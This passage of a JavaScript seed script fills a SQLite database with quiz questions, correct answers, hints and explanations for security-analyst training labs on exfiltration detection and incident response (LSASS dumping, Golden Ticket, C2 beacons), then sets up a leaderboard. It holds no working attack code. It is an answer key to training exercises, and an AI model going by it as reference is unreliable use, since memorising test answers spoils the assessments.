    hint:'Check the PreviousLogins field in ALT-034 raw log.',
    explanation:'The raw log shows "PreviousLogins":"none from this IP" — 185.220.100.250 has never been used by vpandey before. Combined with the 3 AM creation time, this strongly indicates account compromise (phishing or credential stuffing).' },

  { lab_slug:'exfiltration-detection', order_index:4, points:40, difficulty:'hard', answer_type:'choice',
    question:'ALT-022: What makes the kpatel case legally significant beyond the technical indicators?',
    options:JSON.stringify(['The data was encrypted','kpatel is a departing employee whose account was not disabled','The download happened during business hours','The files were small']),
    correct_answer:'kpatel is a departing employee whose account was not disabled',
    hint:'Check the description — what is kpatel\'s employment status?',
    explanation:'kpatel\'s HR offboarding was initiated 2 days prior but the account was NOT disabled — a common process failure. This is an insider threat scenario with legal implications: the data stolen (Product roadmap, Customer PII) has regulatory consequences.' },

  { lab_slug:'exfiltration-detection', order_index:5, points:40, difficulty:'expert', answer_type:'choice',
    question:'ALT-050 (Supply Chain): What immediate action must be taken for the AWS credentials?',
    options:JSON.stringify(['Delete the npm package','Rotate the AWS credentials immediately','Block 185.199.108.200','Rebuild the CI server']),
    correct_answer:'Rotate the AWS credentials immediately',
    hint:'The credentials were already exfiltrated and used — what is the priority?',
    explanation:'The AWS keys were already exfiltrated AND used (ListBuckets call from 185.199.108.200). Rotation is the immediate priority to prevent further abuse. All other steps (delete package, block IP, rebuild) are important but secondary to stopping active credential misuse.' },

  // ── Lab 6: Incident Response ───────────────────────────
  { lab_slug:'incident-response', order_index:1, points:60, difficulty:'medium', answer_type:'choice',
    question:'The attack chain starts with ALT-018. What vulnerability in Adobe Acrobat was exploited?',
    options:JSON.stringify(['CVE-2021-44228','CVE-2023-21608','CVE-2022-30190','CVE-2017-11882']),
    correct_answer:'CVE-2023-21608',
    hint:'Check the CVE field in the ALT-018 raw log.',
    explanation:'CVE-2023-21608 is an Adobe Acrobat Remote Code Execution vulnerability. The attacker used a spoofed HR domain (hr-corp.com vs hr.corp.com) to deliver a malicious PDF to 3 recipients.' },

  { lab_slug:'incident-response', order_index:2, points:60, difficulty:'medium', answer_type:'choice',
    question:'After initial access (ALT-018), the attacker established C2 (ALT-006). What was the C2 beacon interval?',
    options:JSON.stringify(['15 seconds','30 seconds','60 seconds','120 seconds']),
    correct_answer:'60 seconds',
    hint:'Check the beacon interval in ALT-006 description or ALT-025.',
    explanation:'The PowerShell Empire C2 beacon interval was 60 seconds (ALT-006). A 60-second beacon is common — frequent enough for attacker control but slow enough to blend with legitimate traffic and avoid rate-based detection.' },

  { lab_slug:'incident-response', order_index:3, points:60, difficulty:'hard', answer_type:'choice',
    question:'ALT-003 shows LSASS dumped on WS-DEVOPS-02. What does the attacker likely do with these credentials NEXT?',
    options:JSON.stringify(['Encrypt the host immediately','Perform lateral movement to other hosts','Delete Windows event logs','Install a keylogger']),
    correct_answer:'Perform lateral movement to other hosts',
    hint:'Think about the attack chain — credentials are a means to an end, not the goal.',
    explanation:'Credential dumping is almost always followed by lateral movement. With plaintext credentials or NTLM hashes from LSASS, the attacker moves to higher-value targets (servers, DCs) — as seen in ALT-009 (Pass-the-Hash) and ALT-010 (PsExec).' },

  { lab_slug:'incident-response', order_index:4, points:60, difficulty:'hard', answer_type:'choice',
    question:'The attack culminates in ALT-037 (Golden Ticket). What is the FIRST remediation step?',
    options:JSON.stringify(['Reimagine all workstations','Reset krbtgt password twice with 10-hour gap','Disable all domain admin accounts','Block all lateral movement IPs at firewall']),
    correct_answer:'Reset krbtgt password twice with 10-hour gap',
    hint:'A Golden Ticket is valid as long as the krbtgt hash is unchanged. How do you invalidate it?',
    explanation:'The krbtgt password must be reset TWICE — once to invalidate existing tickets, and again 10 hours later (max ticket lifetime) to ensure all cached tickets expire. A single reset is insufficient because old TGTs remain valid until they naturally expire.' },

  { lab_slug:'incident-response', order_index:5, points:60, difficulty:'expert', answer_type:'choice',
    question:'Reviewing the full attack chain (ALT-018 → ALT-006 → ALT-003 → ALT-009 → ALT-036 → ALT-037): which MITRE tactic is the FINAL stage?',
    options:JSON.stringify(['Exfiltration','Lateral Movement','Persistence','Command and Control']),
    correct_answer:'Persistence',
    hint:'A Golden Ticket gives the attacker long-term access — which tactic does long-term access represent?',
    explanation:'The Golden Ticket (ALT-037) represents the Persistence tactic — it gives the attacker a forged credential valid for 10 years that survives password resets, system reboots, and most IR actions. This is the attacker\'s "stay behind" mechanism after achieving Domain Admin.' },
];

// seed questions
db.prepare(`CREATE TABLE IF NOT EXISTS questions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  lab_id INTEGER NOT NULL,
  order_index INTEGER DEFAULT 0,
  points INTEGER DEFAULT 20,
  difficulty TEXT DEFAULT 'medium',
  answer_type TEXT DEFAULT 'choice',
  question TEXT NOT NULL,
  options TEXT,
  correct_answer TEXT NOT NULL,
  hint TEXT,
  explanation TEXT
)`).run();

const labRows = db.prepare('SELECT id, slug FROM labs').all();
const labMap  = Object.fromEntries(labRows.map(r => [r.slug, r.id]));

const insertQ = db.prepare(`
  INSERT OR IGNORE INTO questions
  (lab_id,order_index,points,difficulty,answer_type,question,options,correct_answer,hint,explanation)
  VALUES (?,?,?,?,?,?,?,?,?,?)`);

let qCount = 0;
for (const q of questions) {
  const labId = labMap[q.lab_slug];
  if (!labId) { console.warn('Unknown lab slug:', q.lab_slug); continue; }
  insertQ.run(labId, q.order_index, q.points, q.difficulty, q.answer_type,
              q.question, q.options || null, q.correct_answer, q.hint || null, q.explanation || null);
  qCount++;
}
console.log(`✓ ${qCount} questions seeded`);

// ── leaderboard init ──────────────────────────────────────
db.prepare(`INSERT OR IGNORE INTO leaderboard (user_id, total_score, rank, labs_completed, accuracy)
  SELECT id, 0, 0, 0, 0.0 FROM users WHERE role = 'analyst'`).run();
console.log('✓ Leaderboard initialised (all analysts start at rank 0, score 0)');

console.log('\n✓ Seed complete.');
db.close();
